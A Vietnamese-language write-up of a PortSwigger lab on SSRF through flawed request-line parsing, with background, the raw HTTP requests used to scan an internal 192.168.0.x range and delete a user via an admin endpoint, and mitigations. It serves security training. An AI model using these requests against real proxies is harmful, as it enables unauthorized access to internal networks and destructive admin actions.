---
title: "[PortSwigger] Lab 5: SSRF via Flawed Request Parsing"
date: 2026-09-14
description: "Khai thác SSRF dựa trên sự bất đồng bộ trong việc phân tích cú pháp Absolute URL trong Request Line so với header Host giữa reverse proxy và backend."
categories: ["PortSwigger Labs"]
series: ["HTTP Host Header Attacks"]
series_order: 5
showAuthor: false
showTableOfContents: true
---

## Thông tin bài Lab
* **Tên bài Lab**: SSRF via flawed request parsing
* **Chuyên đề**: HTTP Host Header attacks
* **Mức độ**: Practitioner
* **Mục tiêu**: Khai thác lỗi phân tích request line để gửi yêu cầu đến mạng nội bộ `192.168.0.0/24` và xóa người dùng `carlos`.

---

## 1. Kiến thức nền tảng

Theo chuẩn RFC 7230, một HTTP Request có thể chứa **Absolute URL** trong Request Line:
```http
GET https://vulnerable-website.com/ HTTP/1.1
Host: internal-server
```

Khi một Reverse Proxy nhận được request có cả Absolute URL và header `Host`:
* Nếu Proxy ưu tiên Request Line để định tuyến, nhưng Backend Server lại ưu tiên header `Host` (hoặc ngược lại), sự bất đồng bộ này có thể bị lợi dụng để bypass kiểm soát truy cập hoặc dẫn đến SSRF.

---

## 2. Mô hình tấn công

Hệ thống proxy trung gian kiểm tra tính hợp lệ của request dựa trên URL trong Request Line. Khi Request Line chứa domain hợp lệ của bài lab, proxy cho phép request đi qua.

Tuy nhiên, khi chuyển tiếp request đến backend, proxy lại đọc giá trị từ header `Host` để thiết lập kết nối TCP, mở ra cơ hội thực hiện tấn công SSRF vào mạng nội bộ.

---

## 3. Khai thác lỗ hổng

### Bước 1: Gửi Request kết hợp Absolute URL và Internal Host
Chuyển request sang Burp Repeater và cấu hình:
```http
GET https://YOUR-LAB-ID.web-security-academy.net/admin HTTP/1.1
Host: 192.168.0.§1§
```

### Bước 2: Quét IP nội bộ trong Burp Intruder
1. Đặt payload dạng số từ `1` đến `255` vào octet cuối của IP.
2. Tìm IP trả về mã trạng thái `200 OK` (ví dụ `192.168.0.72`).

### Bước 3: Thực hiện xóa tài khoản `carlos`
Gửi request với CSRF token tương ứng:
```http
POST https://YOUR-LAB-ID.web-security-academy.net/admin/delete HTTP/1.1
Host: 192.168.0.72
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

csrf=...&username=carlos
```
Bài lab hoàn thành!

---

## 4. Biện pháp khắc phục
* **Chuẩn hóa Request trước khi chuyển tiếp**: Đảm bảo reverse proxy luôn chuyển đổi Absolute URL thành Relative path kết hợp Host header thống nhất trước khi gửi tiếp tới backend.
* **Đồng bộ cơ chế HTTP Parser**: Sử dụng các phiên bản phần mềm proxy và backend server tuân thủ nghiêm ngặt cùng một tiêu chuẩn RFC.
